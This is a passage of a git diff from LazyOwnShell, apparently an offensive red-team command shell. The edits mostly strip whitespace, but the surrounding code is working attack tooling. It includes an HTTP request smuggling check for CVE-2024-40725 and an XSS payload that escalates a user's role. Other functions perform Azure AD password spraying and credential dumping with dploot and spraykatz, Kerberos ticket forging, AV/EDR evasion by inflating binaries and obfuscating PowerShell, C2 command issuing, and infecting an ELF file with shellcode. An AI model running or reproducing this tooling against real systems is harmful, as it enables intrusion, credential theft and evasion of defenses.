         print_msg(f"MITRE ID: {selected_test['mitre_id']}")
         print_msg(f"MITRE url: https://attack.mitre.org/techniques/{mitre_url}")
-        
+
         rhost = self.params["rhost"]
         domain = self.params["domain"]
         rport = self.params["rport"]
@@ -21384,13 +21386,13 @@ class LazyOwnShell(cmd2.Cmd):
         platform = selected_test["platforms"][0]
         extension = ".sh" if platform in ["linux", "macos"] else ".ps1"
         log_path = f"{tmp_path}/{test_id}.log"
-        
+
         if platform == "windows":
             test_script_content = f"""
             Start-Transcript -Path "{log_path}"
             # Get prerequisite command
             {get_prereq_command}
-            
+
             # Prerequisite command
             {prereq_command}
 
@@ -21495,7 +21497,7 @@ class LazyOwnShell(cmd2.Cmd):
             rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:/tmp/lazyown_atomic_test && sshpass -p '{password}' ssh {username}@{rhost} 'cd /tmp/lazyown_atomic_test/ && chmod +x /tmp/lazyown_atomic_test/* && echo \"grisgrisgris\" | sudo -S /tmp/lazyown_atomic_test/atomic_agent.sh'"
         else:
             rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:C:/Users/grisun0/Documents/ && sshpass -p '{password}' ssh {username}@{rhost} powershell.exe -Command \"Start-Process powershell.exe -ArgumentList '-File', 'C:/Users/grisun0/Documents/lazyown_atomic_test/atomic_agent.ps1' -Verb RunAs\""
-        
+
         exit_code = self.cmd(rsync_command)
         if line.startswith("web"):
             print_warn("Executing from web. avoid interaction.")
@@ -21505,18 +21507,18 @@ class LazyOwnShell(cmd2.Cmd):
             rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:/tmp/lazyown_atomic_test && sshpass -p '{password}' ssh {username}@{rhost} 'cd /tmp/lazyown_atomic_test/ && chmod +x /tmp/lazyown_atomic_test/* && echo \"grisgrisgris\" | sudo -S /tmp/lazyown_atomic_test/atomic_clean_agent.sh'"
         else:
             rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:C:/Users/grisun0/Documents/ && sshpass -p '{password}' ssh {username}@{rhost} powershell.exe -Command \"Start-Process powershell.exe -ArgumentList '-File', 'C:/Users/grisun0/Documents/lazyown_atomic_test/atomic_clean_agent.ps1' -Verb RunAs\""
-            
+
 
         exit_code = self.cmd(rsync_command)
-        
+
         # Transfer logs back to C2
         log_path = f"{tmp_path}/*.log"
         if extension == ".sh":
             scp_command = f"sshpass -p '{password}' scp {username}@{rhost}:{log_path} {sessions_path}/"
         else:
             scp_command = f"sshpass -p '{password}' scp {username}@{rhost}:C:/Users/grisun0/Documents/lazyown_atomic_test/*.log {sessions_path}/"
-        self.cmd(scp_command)        
-        
+        self.cmd(scp_command)
+
         if exit_code == 0:
             print_msg("Agent deployed and executed successfully.")
         else:
@@ -21627,7 +21629,7 @@ class LazyOwnShell(cmd2.Cmd):
     def do_mitre_test(self, line):
         """
         Interacts with the MITRE ATT&CK framework using the STIX 2.0 format.
-        
+
         This function connects to a locally cached or downloaded ATT&CK dataset in STIX 2.0 format.
         It allows the user to explore tactics, techniques, and procedures (TTPs) and filter them
         based on specific criteria, such as platform or tactic.
@@ -21645,18 +21647,18 @@ class LazyOwnShell(cmd2.Cmd):
             mitre_repo = "https://github.com/mitre-attack/attack-stix-data.git"
             mitre_path = os.path.join("external", ".exploit", "mitre")
             enterprise_attack_path = os.path.join(mitre_path,"enterprise-attack", "enterprise-attack-16.1.json")
-            
+
             if not os.path.exists(mitre_path):
                 print_warn("MITRE ATT&CK repository not found. Cloning...")
                 os.makedirs(mitre_path, exist_ok=True)
                 self.cmd(f"git clone {mitre_repo} {mitre_path}")
                 print_msg("Repository cloned successfully.")
-            
+
             if not os.path.exists(enterprise_attack_path):
                 print_warn("Error: Enterprise ATT&CK dataset not found in the cloned repository.")
                 print_warn("Please verify the repository structure.")
                 return
-            
+
             print_msg("MITRE ATT&CK dataset ready. Performing analysis...")
 
             with open(enterprise_attack_path, "r") as f:
@@ -21966,7 +21968,7 @@ class LazyOwnShell(cmd2.Cmd):
     def do_bbot(self, line):
         """
         Executes a BBOT scan to perform various reconnaissance tasks.
-        
+
         This function leverages BBOT, a reconnaissance tool, to perform tasks such as subdomain enumeration,
         email gathering, web scanning, and more. It dynamically determines the operation based on user input
         and executes the appropriate BBOT commands.
@@ -21976,7 +21978,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         Usage:
             bbot -t <target> -p <preset>
-            
+
             Examples:
                 bbot -t evilcorp.com -p subdomain-enum
                 bbot -t evilcorp.com -p email-enum spider web-basic
@@ -21988,7 +21990,7 @@ class LazyOwnShell(cmd2.Cmd):
                 self.cmd("pipx install bbot")
                 print_msg("BBOT installed successfully.")
 
-            domain = self.params.get("domain", "localhost")  
+            domain = self.params.get("domain", "localhost")
 
             choice = input("    [!] Enter the mode (1 Subdomain, 2 Spider, 3 Email, 4 Web, 5 Web thorough, 6 All): ") or '6'
 
@@ -21999,11 +22001,11 @@ class LazyOwnShell(cmd2.Cmd):
             elif choice == "3":
                 command = f"bbot -t {domain} -p email-enum "
             elif choice == "4":
-                command = f"bbot -t {domain} -p web-basic "    
+                command = f"bbot -t {domain} -p web-basic "
             elif choice == "5":
-                command = f"bbot -t {domain} -p web-thorough "        
+                command = f"bbot -t {domain} -p web-thorough "
             elif choice == "6":
-                command = f"bbot -t {domain} -p subdomain-enum cloud-enum code-enum email-enum spider web-basic paramminer dirbust-light web-screenshots --allow-deadly"  
+                command = f"bbot -t {domain} -p subdomain-enum cloud-enum code-enum email-enum spider web-basic paramminer dirbust-light web-screenshots --allow-deadly"
             print_msg(f"Ejecutando comando BBOT: {command}")
             self.cmd(command)
             self.logcsv(f"bbot {command}")
@@ -22040,16 +22042,16 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd(command)
         self.logcsv(f"amass {command}")
         print_msg(f"Amass enumeration completed. Results saved in sessions/amass_{domain}_results.txt.")
-    
+
     @cmd2.with_category(exploitation_category)
     def do_filtering(self, line):
         """
         Applies various filtering techniques to the given command line by modifying each character or word appropriately.
-        
+
         This function takes any command and generates variations of it using several filtering techniques, including:
         1. Quote filtering.
         2. Slash filtering.
-        
+
         Parameters:
         line (str): The input command to be filtered.
 
@@ -22086,7 +22088,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         rhost = self.params["rhost"]
         url = f'http://{rhost}'
-        
+
         smuggled_request = (
             "POST / HTTP/1.1\r\n"
             "Host: {}\r\n"
@@ -22102,21 +22104,21 @@ class LazyOwnShell(cmd2.Cmd):
 
         try:
             response = requests.post(url, data=smuggled_request, headers={'Content-Type': 'text/plain'}, timeout=10)
-            
+
             if response.status_code == 200 and "admin" in response.text:
                 print_msg(f"目標 {url} 可能存在 CVE-2024-40725 漏洞")
             else:
                 print_msg(f"目標 {url} 不存在 CVE-2024-40725 漏洞")
         except Exception as e:
             print_error(f"檢測過程中出錯: {e}")
-            
+
         payload = "4\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n0\r\n4\r\n"
         headers = {
         'Content-Type': 'multipart/form-data; boundary=4'
         }
         response = requests.request("POST", url, headers=headers, data=payload)
 
-        print_msg(response.text)        
+        print_msg(response.text)
         payload = (
             "<img src=x onerror=\"fetch('/api/update_role', {method: 'POST', headers: { 'Content-Type': 'application/json'}, "
             "body: JSON.stringify({ 'username': 'grisun0', 'role': 'grisun0'})})\" />"
@@ -22189,11 +22191,11 @@ class LazyOwnShell(cmd2.Cmd):
                 self.cmd("clear")
                 print_msg(''.join([i for i in utf]))
             self.logcsv(f"utf {payload}")
-        except SystemExit:  
+        except SystemExit:
             print_error("Invalid arguments provided. Use '-h' for help. or help utf")
             return
 
-    @cmd2.with_category(lateral_movement_category) 
+    @cmd2.with_category(lateral_movement_category)
     def do_dcomexec(self, line):
         """
         Executes the Impacket dcomexec tool to run commands on a remote system using DCOM.
@@ -22263,7 +22265,7 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             print_error("Incorrect usage. Use 'pass' to authenticate with credentials or 'hash' to use a hash.")
             return
-    @cmd2.with_category(post_exploitation_category) 
+    @cmd2.with_category(post_exploitation_category)
     def do_pip_repo(self, line):
         """
         Sets up a local pip repository to serve Python packages for installation on a compromised machine without internet access.
@@ -22287,7 +22289,7 @@ class LazyOwnShell(cmd2.Cmd):
         ```
         pip_repo
         ```
-        """        
+        """
         path = os.getcwd()
         sessions = f"{path}/sessions"
         repo = f"{sessions}/pip-repo"
@@ -22298,7 +22300,7 @@ class LazyOwnShell(cmd2.Cmd):
         if not is_binary_present("pip-compile"):
             print_warn("pip-compile not found in the system. Installing")
             self.cmd("pip3 install pip-tools")
-            
+
         packages = [
             "requests", "python-libnmap", "pwncat-cs", "pwn", "groq", "PyPDF2", "docx", "python-docx", "olefile",
             "exifread", "pycryptodome", "impacket", "pandas", "colorama", "tabulate", "pyarrow", "keyboard",
@@ -22348,7 +22350,7 @@ class LazyOwnShell(cmd2.Cmd):
         os.chdir(path)
         return
 
-    @cmd2.with_category(post_exploitation_category) 
+    @cmd2.with_category(post_exploitation_category)
     def do_apt_repo(self, line):
         """
         Creates a comprehensive local APT repository with enhanced dependency resolution.
@@ -22394,32 +22396,32 @@ class LazyOwnShell(cmd2.Cmd):
 
             print_msg("Resolving and downloading packages with comprehensive dependency handling...")
             downloaded_packages = set()
-            
+
             def resolve_and_download_dependencies(package_name):
                 """
                 Recursively resolve and download package dependencies with enhanced checks
                 """
                 if package_name in downloaded_packages:
                     return
-                
+
                 try:
                     deps_output = subprocess.check_output(
                         f"apt-cache depends --recurse --no-recommends --no-suggests {package_name}",
                         shell=True, text=True
                     )
-                    
+
                     dependencies = set(
-                        line.split()[-1] for line in deps_output.splitlines() 
-                        if (line.strip().startswith('Depends:') or 
-                            line.strip().startswith('PreDepends:') or 
+                        line.split()[-1] for line in deps_output.splitlines()
+                        if (line.strip().startswith('Depends:') or
+                            line.strip().startswith('PreDepends:') or
                             line.strip().startswith('Recommends:'))
                     )
-                    
+
                     download_command = f"cd {repo} && apt-get download {package_name}:{arch}"
                     print_msg(f"Downloading: {package_name}")
                     subprocess.run(download_command, shell=True, check=True)
                     downloaded_packages.add(package_name)
-                    
+
                     for dep in dependencies:
                         if dep not in downloaded_packages:
                             try:
@@ -22454,7 +22456,7 @@ class LazyOwnShell(cmd2.Cmd):
             Date: {current_time.strftime('%a, %d %b %Y %H:%M:%S UTC')}
             Valid-Until: {(current_time + timedelta(days=30)).strftime('%a, %d %b %Y %H:%M:%S UTC')}
             """.replace('            ','')
-            
+
             with open(f"{repo}/Release", "w") as release_file:
                 release_file.write(release_content)
 
@@ -22497,7 +22499,7 @@ class LazyOwnShell(cmd2.Cmd):
             """.replace('            ',''), shell=True, check=True)
             subprocess.run(f"""mkdir -p {repo}/dists/kali-rolling/main/cnf
             touch {repo}/dists/kali-rolling/main/cnf/Commands-amd64.xz
-            """.replace('            ',''), shell=True, check=True)               
+            """.replace('            ',''), shell=True, check=True)
             os.chdir(path)
             if not os.path.exists(credentials):
                 if not username:
@@ -22534,7 +22536,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_error("Invalid arguments provided. Use '-h' for help or help apt_repo")
             return
 
-    @cmd2.with_category(recon_category)       
+    @cmd2.with_category(recon_category)
     def do_httprobe(self, line):
         """
         Executes the httprobe tool to probe domains for working HTTP and HTTPS servers.
@@ -22577,13 +22579,13 @@ class LazyOwnShell(cmd2.Cmd):
         self.logcsv(f"httprobe {command}")
         return
 
-    @cmd2.with_category(reporting_category)    
+    @cmd2.with_category(reporting_category)
     def do_eyewitness_py(self, line):
         """
         Automates EyeWitness installation and execution without requiring user input.
-        
-        This function installs EyeWitness if it is not already available, uses a default input file 
-        (`urls.txt`), and applies standard configurations to execute a web enumeration task 
+
+        This function installs EyeWitness if it is not already available, uses a default input file
+        (`urls.txt`), and applies standard configurations to execute a web enumeration task
         automatically. No arguments or manual intervention are needed from the user.
 
         Behavior:
@@ -22625,7 +22627,7 @@ class LazyOwnShell(cmd2.Cmd):
         except Exception as e:
             print_error(f"Error: {e}")
 
-    @cmd2.with_category(reporting_category)   
+    @cmd2.with_category(reporting_category)
     def do_pup(self, line):
         """
         Processes HTML content from a specified URL using the pup utility and a default CSS selector.
@@ -22646,7 +22648,7 @@ class LazyOwnShell(cmd2.Cmd):
         path = os.getcwd()
         pup_repo = "https://github.com/ericchiang/pup.git"
         pup_path = os.path.join("external", ".exploit", "pup")
-        pup_path = path + "/" + pup_path        
+        pup_path = path + "/" + pup_path
         try:
             if not is_binary_present("pup"):
                 print_error("pup is not installed. Installing ''")
@@ -22655,7 +22657,7 @@ class LazyOwnShell(cmd2.Cmd):
                 command = f"cd {pup_path} && go get github.com/ericchiang/pup && go build && go install"
                 print_msg(command)
                 self.cmd(command)
-                
+
 
             url = self.params.get("url")
             if not url:
@@ -22671,14 +22673,14 @@ class LazyOwnShell(cmd2.Cmd):
         except Exception as e:
             print_error(f"Error: {e}")
         return
-    
-    @cmd2.with_category(recon_category)   
+
+    @cmd2.with_category(recon_category)
     def do_recon(self, line):
         """
         Performs reconnaissance on a specified domain using crt.sh (the target must be visible on internet), pup, httprobe, and EyeWitness.
 
-        This function automates the process of gathering subdomains for a given domain, verifying 
-        their reachability, and generating a report using the EyeWitness tool. 
+        This function automates the process of gathering subdomains for a given domain, verifying
+        their reachability, and generating a report using the EyeWitness tool.
 
         Workflow:
             1. Determines the target domain from the `line` argument or defaults to `self.params["domain"]`.
@@ -22709,7 +22711,7 @@ class LazyOwnShell(cmd2.Cmd):
         path = os.getcwd()
         sessions = f"{path}/sessions"
         eyewitness_path = os.path.join("external", ".exploit", "EyeWitness")
-        eyewitness_path = path + "/" + eyewitness_path        
+        eyewitness_path = path + "/" + eyewitness_path
 
         if line:
             domain = line.strip()
@@ -22725,16 +22727,16 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(command)
         self.logcsv(f"recon {command}")
         return
-    
+
     @cmd2.with_category(exploitation_category)
     def do_digdug(self, line):
         """
-        Executes Dig Dug to inflate the size of an executable file, leveraging pre-configured settings 
+        Executes Dig Dug to inflate the size of an executable file, leveraging pre-configured settings
         and interactive input for minimal user effort.
 
-        This function integrates with the Dig Dug tool to increase an executable's size by appending 
-        dictionary words. It automates repository setup, selects the input file from user prompts or defaults, 
-        and uses sensible configurations to execute the inflation process. Dig Dug is particularly useful 
+        This function integrates with the Dig Dug tool to increase an executable's size by appending
+        dictionary words. It automates repository setup, selects the input file from user prompts or defaults,
+        and uses sensible configurations to execute the inflation process. Dig Dug is particularly useful
         for evading AV/EDR detections by exceeding size thresholds for analysis.
 
         Behavior:
@@ -22789,14 +22791,14 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Performs a password spray attack on Azure Active Directory Seamless Single Sign-On (SSO) using a specified list of users.
 
-        This function automates the process of spraying a given password across multiple user accounts in a target domain. It utilizes 
-        a user list in the form of a text file, targeting Azure AD Seamless SSO endpoints. The results are processed and saved to 
+        This function automates the process of spraying a given password across multiple user accounts in a target domain. It utilizes
+        a user list in the form of a text file, targeting Azure AD Seamless SSO endpoints. The results are processed and saved to
         a specified output file, providing insights into which accounts were successful or failed during the attack.
 
         Requirements:
             - A valid domain and URL for the target Azure AD instance. (assing url https://url.com)
             - A user dictionary file containing usernames (without the domain) to be sprayed.
-        
+
         Parameters:
             line (str): Command-line input passed to the function (not currently used in the function).
 
@@ -22824,12 +22826,12 @@ class LazyOwnShell(cmd2.Cmd):
 
         for line in users_dic:
             users.append(line.split('@')[0].strip())
-            
 
-        results = Spray(domain, users, password, url, wait, True, False)	
-        ProcessResults(results, output_file)        
+
+        results = Spray(domain, users, password, url, wait, True, False)
+        ProcessResults(results, output_file)
         return
-    
+
     @cmd2.with_category(credential_access_category)
     def do_creds_py(self, line):
         """
@@ -22950,7 +22952,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg("Exploit completed. You now have access to the target user.")
         except Exception as e:
             print_error(f"An error occurred: {e}")
-    
+
     @cmd2.with_category(miscellaneous_category)
     def do_tab(self, line):
         """
@@ -22966,7 +22968,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         Returns:
             None
-        """        
+        """
         if line:
             command = f"python3 modules/lazypyautogui.py {line}"
         else:
@@ -22974,7 +22976,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(command)
         self.cmd(command)
         return
-    
+
     @cmd2.with_category(exploitation_category)
     def do_excelntdonut(self, line):
         """
@@ -23011,9 +23013,9 @@ class LazyOwnShell(cmd2.Cmd):
             input_file = get_users_dic("cs")
             output_file = f"{path}/sessions/output_{domain}.txt"
             references = input("    [!] Enter the References default (System.Management) : ") or 'System.Management'
-            sandbox = "--sandbox" 
+            sandbox = "--sandbox"
             obfuscate = "--obfuscate"
-            
+
             if not input_file or not references:
                 raise ValueError("Input file (-f) and references (-r) are required.")
 
@@ -23030,7 +23032,7 @@ class LazyOwnShell(cmd2.Cmd):
         except Exception as e:
             print_error(f"Error: {e}")
         return
-    
+
     @cmd2.with_category(credential_access_category)
     def do_spraykatz(self, line):
         """
@@ -23075,7 +23077,7 @@ class LazyOwnShell(cmd2.Cmd):
                     return
                 for username, password in credentials:
                     command =  f"cd {spraykatz_path} && ./spraykatz.py -u {username} -p {password} -t {target}"
-            
+
             if not target:
                 print_error("Target not defined in self.params['target'].")
                 target = input("    [!] Enter the target (e.g., 192.168.1.0/24): ")
@@ -23136,7 +23138,7 @@ class LazyOwnShell(cmd2.Cmd):
             self.logcsv(f"caldera {command}")
         except Exception as e:
             print_error(f"Error: {e}")
-    
+
     @cmd2.with_category(exploitation_category)
     def do_ntpdate(self, line):
         """
@@ -23150,9 +23152,9 @@ class LazyOwnShell(cmd2.Cmd):
         :param line: The command line input (not used in this method).
         :type line: str
         :return: None
-        """        
-        domain = self.params["domain"] 
-        subdomain = self.params["subdomain"] 
+        """
+        domain = self.params["domain"]
+        subdomain = self.params["subdomain"]
         target = f"{subdomain}.{domain}"
         target = input(f"    [!] Enter the target to need to synchronize our clock (default:{target}) ") or target
         command = f" sudo ntpdate -u {target}"
@@ -23160,7 +23162,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd(command)
         self.logcsv(f"ticketer {command}")
         return
-    
+
     @cmd2.with_category(exploitation_category)
     def do_ticketer(self, line):
         """
@@ -23183,7 +23185,7 @@ class LazyOwnShell(cmd2.Cmd):
         subdomain = self.params["subdomain"]
         full_domain = f"{domain}.{subdomain}".upper()
         path = os.getcwd()
-        
+
         if not is_binary_present("impacket-ticketer"):
             print_warn("impacket-ticketer is not installed. Installing dependencies.")
             self.cmd("sudo apt install impacket -y")
@@ -23203,7 +23205,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd(command)
 
         return
-    
+
     @cmd2.with_category(miscellaneous_category)
     def do_links(self, line=""):
         """
@@ -23251,14 +23253,14 @@ class LazyOwnShell(cmd2.Cmd):
         filtered_links = [(alias, cmd) for alias, cmd in links if line.lower() in alias.lower() or line.lower() in cmd.lower()] if line else links
 
         for idx, (alias, cmd) in enumerate(filtered_links):
-            if cmd: 
+            if cmd:
                 print_msg(f"{idx + 1}{RESET}. Alias:{GREEN} {alias}{RESET}, Link:{CYAN} {cmd}")
 
         try:
             choice = int(input("    [!] Enter the number of the command you want to execute: ")) - 1
             if 0 <= choice < len(filtered_links):
                 selected_cmd = filtered_links[choice]
-                
+
                 copy2clip(selected_cmd[1])
             else:
                 print_error("Invalid choice. Please select a valid number.")
@@ -23273,7 +23275,7 @@ class LazyOwnShell(cmd2.Cmd):
         Synchronizes the local "sessions" directory to a remote host using rsync, leveraging sshpass for automated authentication.
 
         Steps:
-            1. Verifies if the credentials file exists in the "sessions" directory. 
+            1. Verifies if the credentials file exists in the "sessions" directory.
             If not, prompts the user for a username and password.
             2. Reads the credentials file if it exists and extracts the username and password.
             3. Constructs an rsync command to deploy the "sessions" directory to the remote host.
@@ -23298,7 +23300,7 @@ class LazyOwnShell(cmd2.Cmd):
             - FileNotFoundError: If the "sessions" directory does not exist.
 
         Note:
-            - The `credentials.txt` file, if present, should have credentials in the format `username:password` 
+            - The `credentials.txt` file, if present, should have credentials in the format `username:password`
             on the first line.
 
         Returns:
@@ -23327,13 +23329,13 @@ class LazyOwnShell(cmd2.Cmd):
 
         rhost = self.params["rhost"]
         print_msg("Deploying sessions directory.")
-        
+
         rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:/home/.grisun0"
         print_msg(rsync_command)
         self.cmd(rsync_command)
-        
+
         return
-    
+
     @cmd2.with_category(scanning_category)
     def do_pre2k(self, line):
         """
@@ -23398,7 +23400,7 @@ class LazyOwnShell(cmd2.Cmd):
             elif command == "unauth":
                 domain = self.params.get("domain")
                 dc_ip = self.params.get("rhost")
-             
+
 
                 if not domain:
                     print_error("Domain not defined.")
@@ -23423,9 +23425,9 @@ class LazyOwnShell(cmd2.Cmd):
                 print_error("Invalid command. Use 'auth' or 'unauth'.")
                 return
 
-            
+
             self.cmd(command)
-            
+
 
         except Exception as e:
             print_error(f"Error: {e}")
@@ -23457,7 +23459,7 @@ class LazyOwnShell(cmd2.Cmd):
             if not os.path.exists(gmsadumper_path):
                 print_msg("gMSADumper is not installed. Installing...")
                 self.cmd(f"git clone {gmsadumper_repo} {gmsadumper_path}")
-           
+
             domain = self.params.get("domain")
             subdomain = self.params.get("subdomain")
             ldap_server = f"{subdomain}.{domain}"
@@ -23553,7 +23555,7 @@ class LazyOwnShell(cmd2.Cmd):
                 action = input("    [!] Enter the action (backupkey,blob,browser,certificates,credentials,machinecertificates,machinecredentials,machinemasterkeys,machinetriage,machinevaults,masterkeys,mobaxterm,rdg,sccm,triage,vaults,wam,wifi) default: blob") or "blob"
             else:
                 action = line.split()[0]
-            rhost = self.params.get("rhost")    
+            rhost = self.params.get("rhost")
             domain = self.params.get("domain")
             subdomain = self.params.get("subdomain")
             ldap_server = f"{subdomain}.{domain}"
@@ -23561,8 +23563,8 @@ class LazyOwnShell(cmd2.Cmd):
             credentials_path = os.path.join(os.getcwd(), "sessions", "credentials.txt")
             if not os.path.exists(credentials_path):
                 username = self.params.get("username") or input("    [!] Enter the username: ")
-                password = self.params.get("password") or input("    [!] Enter the password: ")                
-                command = f"dploot {action} -d {domain} -u {username} -p '{password}' -t {rhost} " 
+                password = self.params.get("password") or input("    [!] Enter the password: ")
+                command = f"dploot {action} -d {domain} -u {username} -p '{password}' -t {rhost} "
             else:
                 credentials_path = get_users_dic("txt")
                 with open(credentials_path, "r") as f:
@@ -23575,9 +23577,9 @@ class LazyOwnShell(cmd2.Cmd):
                 if not domain:
                     print_error("Domain not defined.")
                     domain = input("    [!] Enter the domain: ")
-                
+
                 command = f"dploot {action}  -d {domain} -u {username} -p '{password}' -t {rhost} "
-            
+
             if action == "backupkey":
                 args = " -quiet"
             elif action == "blob":
@@ -23591,25 +23593,25 @@ class LazyOwnShell(cmd2.Cmd):
             elif action == "credentials":
                 args = f" -mkfile {domain}.mkf"
             elif action == "vaults":
-                args = f" -mkfile {domain}.mkf"  
+                args = f" -mkfile {domain}.mkf"
             elif action == "rdg":
-                args = f" -mkfile {domain}.mkf"                    
+                args = f" -mkfile {domain}.mkf"
             elif action == "machinemasterkeys":
                 args = f" "
             elif action == "machinecredentials":
-                args = f" "    
+                args = f" "
             elif action == "machinevaults":
-                args = f" "  
+                args = f" "
             elif action == "machinecertificates":
-                args = f" "    
+                args = f" "
             elif action == "wifi":
-                args = f" "         
+                args = f" "
             elif action == "sccm":
-                args = f" "        
+                args = f" "
             elif action == "mobaxterm":
-                args = f" -pvk key.pvk"    
+                args = f" -pvk key.pvk"
             elif action == "wam":
-                args = f" -pvk key.pvk"                                                                                 
+                args = f" -pvk key.pvk"
             elif action == "masterkeys":
                 choice = input("    [!] Enter 1 to domain backupkey or 2 with credentials") or "1"
                 if choice == '1':
@@ -23647,7 +23649,7 @@ class LazyOwnShell(cmd2.Cmd):
         path = os.getcwd()
         sessions_dir = f'{path}/sessions'
         xml_files = [f for f in os.listdir(sessions_dir) if f.endswith('.xml')]
-        
+
         if not xml_files:
             print_error("No XML files found in the 'sessions' directory.")
             return
@@ -23789,8 +23791,8 @@ class LazyOwnShell(cmd2.Cmd):
                     if quotes:
                         output_file.write('"')
                         print('"')
-                
-                    
+
+
                 elif format == "nim":
                     output_file.write(f"var shellcode: array[{file_size}, byte] = [\nbyte ")
                     print(f"var shellcode: array[{file_size}, byte] = [\nbyte ", end='')
@@ -23807,7 +23809,7 @@ class LazyOwnShell(cmd2.Cmd):
 
                     output_file.write(" ]")
                     print(" ]")
-                    
+
                 else:
                     print_error("Unsupported format. Use 'c' or 'nim'.")
 
@@ -23826,7 +23828,7 @@ class LazyOwnShell(cmd2.Cmd):
         titles, links, scores = scrape_news()
         display_news(titles, links, scores)
         return
-    
+
     @cmd2.with_category(reporting_category)
     def do_vulns(self, line):
         """
@@ -23853,7 +23855,7 @@ class LazyOwnShell(cmd2.Cmd):
         cves_encontrados = scanner.search_cves(servicio)
         scanner.pretty_print(cves_encontrados)
         return
-    
+
     @cmd2.with_category(post_exploitation_category)
     def do_exe2bin(self, line):
         """
@@ -23861,8 +23863,8 @@ class LazyOwnShell(cmd2.Cmd):
 
         Args:
             line (str): Ruta del archivo ejecutable .exe.
-        
-        Return shellcode.bin file in sessions directory    
+
+        Return shellcode.bin file in sessions directory
         """
         if line:
             input_exe = line.strip()
@@ -23873,10 +23875,10 @@ class LazyOwnShell(cmd2.Cmd):
         try:
             with open(input_exe, 'rb') as exe_file:
                 exe_data = exe_file.read()
-            
+
             with open(output_bin, 'wb') as bin_file:
                 bin_file.write(exe_data)
-            
+
             print_msg(f"El archivo {input_exe} ha sido convertido a {output_bin}.")
         except Exception as e:
             print_error(f"Error: {e}")
@@ -23946,7 +23948,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         if not clientid:
             clientid = input (f"    [!] Enter the client id (default {self.c2_clientid}): ") or self.c2_clientid
-        
+
         data = {"client_id": clientid}
         with open(file_path, "rb") as f:
             files = {"file": f}
@@ -23956,7 +23958,7 @@ class LazyOwnShell(cmd2.Cmd):
 
             else:
                 return f"Failed to upload file {file_path}. Status code: {response.status_code}"
-            
+
     @cmd2.with_category(lateral_movement_category)
     def do_upload_c2(self, line):
         """
@@ -23981,7 +23983,7 @@ class LazyOwnShell(cmd2.Cmd):
                 print(response)
             else:
                 print_error("Error")
-        else: 
+        else:
             print("else")
             line = input ("    [!] Enter the path: ") or 'puertos'
             self.upload_file_to_c2(line)
@@ -24101,7 +24103,7 @@ class LazyOwnShell(cmd2.Cmd):
                 user = parts[0]
                 command = parts[1]
                 self.issue_command_to_c2(command, user)
-        else: 
+        else:
             line = input ("    [!] Enter the command: ") or 'whoami'
             self.issue_command_to_c2(line)
 
@@ -24134,7 +24136,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         if not line:
             script_path = get_users_dic("ps1")
-        else: 
+        else:
             script_path = line.strip()
 
         def load_chameleon():
@@ -24147,7 +24149,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         def load_betterxencrypt():
 
-     
+
             print_msg("Loading BetterXencrypt and doing some encryption with random iterations.. ")
             if os.path.exists('./Resources/BetterXencrypt/BetterXencrypt.ps1'):
                 self.cmd(f'pwsh -Command "Import-Module ./Resources/BetterXencrypt/BetterXencrypt.ps1 -Force; Invoke-BetterXencrypt -InFile {script_path} -OutFile {script_path} -Iterations {random.randint(10, 25)}"')
@@ -24306,10 +24308,10 @@ class LazyOwnShell(cmd2.Cmd):
                     return
 
                 for user, passwd in credentials:
-                
+
                     username = user
                     password = passwd
-                
+
 
         rhost = self.params["rhost"]
         print_msg("Deploying sessions directory.")
@@ -24330,7 +24332,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd(scp_command)
 
         return
-    
+
     @cmd2.with_category(post_exploitation_category)
     def do_apt_proxy(self, line):
         """
@@ -24534,12 +24536,12 @@ class LazyOwnShell(cmd2.Cmd):
             if remote_version == "release/0.0.0":
                 print_error("Connect to internet to check updates.")
                 return
-            
+
             local_version_path = os.path.join(os.getcwd(), "version.json")
             with open(local_version_path, 'r') as local_version_file:
                 local_version_data = json.load(local_version_file)
                 local_version = local_version_data.get("version", "release/0.0.0").split('/')[-1]
-            
+
             if local_version == "release/0.0.0":
                 print_error("Integrity fail, please reinstall.")
                 return
@@ -24829,13 +24831,13 @@ class LazyOwnShell(cmd2.Cmd):
         plan_file = os.path.join(sessions, 'plan.txt')
         if os.path.exists(plan_file):
             with open(plan_file, 'r') as f:
-                session_data["plan"] = f.read().strip()                
+                session_data["plan"] = f.read().strip()
         id_rsa_files = glob.glob(os.path.join(sessions, 'id_rsa*'))
         for file in id_rsa_files:
             with open(file, 'r') as f:
                 session_data["id_rsa"].append(f.read().strip())
         implant_files = glob.glob(os.path.join(sessions, 'implant_config*.json'))
-        
+
         for i, file in enumerate(implant_files, start=1):
             with open(file, 'r') as f:
                 content = f.read().strip()
@@ -24846,18 +24848,18 @@ class LazyOwnShell(cmd2.Cmd):
         redop_file = os.path.join(sessions, 'status_redop.txt')
         if os.path.exists(redop_file):
             with open(redop_file, 'r') as f:
-                session_data["redop"] = f.read().strip()         
-        try: 
+                session_data["redop"] = f.read().strip()
+        try:
             with open(session_file, 'w') as f:
                 json.dump(session_data, f, indent=4)
         except Exception as e:
-      
+
             with open(session_file, 'w') as f:
                 json.dump(session_data, f, indent=4)
 
         self.onecmd("load_session")
-    
-    @cmd2.with_category(post_exploitation_category)        
+
+    @cmd2.with_category(post_exploitation_category)
     def do_shellcode2elf(self, line):
         """
         Convert shellcode into an ELF file and infect it.
@@ -24897,12 +24899,12 @@ class LazyOwnShell(cmd2.Cmd):
